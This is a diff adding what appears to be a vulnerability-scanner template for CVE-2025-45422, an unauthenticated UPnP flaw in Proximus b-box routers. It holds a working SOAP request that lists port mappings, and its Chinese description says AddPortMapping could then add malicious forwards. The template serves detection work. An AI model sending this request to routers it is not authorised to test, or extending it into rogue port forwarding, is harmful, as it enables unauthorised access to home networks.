@@ -1,0 +1,47 @@
+[info]
+author = "ave"
+description = "检测 Proximus b-box 路由器 UPnP 访问控制不当漏洞（CVE-2025-45422）。向 UPnP SOAP 控制端点发送 GetGenericPortMappingEntry 请求，若成功获取端口映射条目则证明 UPnP 接口可被未经授权的攻击者访问，可进一步利用 AddPortMapping 操作添加恶意端口转发规则。"
+id = "POC-AVE-2025-0001"
+name = "Proximus b-box UPnP Access Control Bypass PoC"
+severity = "high"
+tags = ["ave-2025-0001"]
+vuln_id = [
+    "CVE-2025-45422",
+    "AVE-2025-0001",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/upnp/control/WANPPPConn0"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0"?>
+<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+  <s:Body>
+    <u:GetGenericPortMappingEntry xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
+      <NewPortMappingIndex>0</NewPortMappingIndex>
+    </u:GetGenericPortMappingEntry>
+  </s:Body>
+</s:Envelope>"""
+type = "raw"
+
+[poc.requests.headers]
+Connection = "close"
+Content-Type = 'text/xml; charset="utf-8"'
+SOAPAction = '"urn:schemas-upnp-org:service:WANPPPConnection:1#GetGenericPortMappingEntry"'
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["NewExternalPort"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
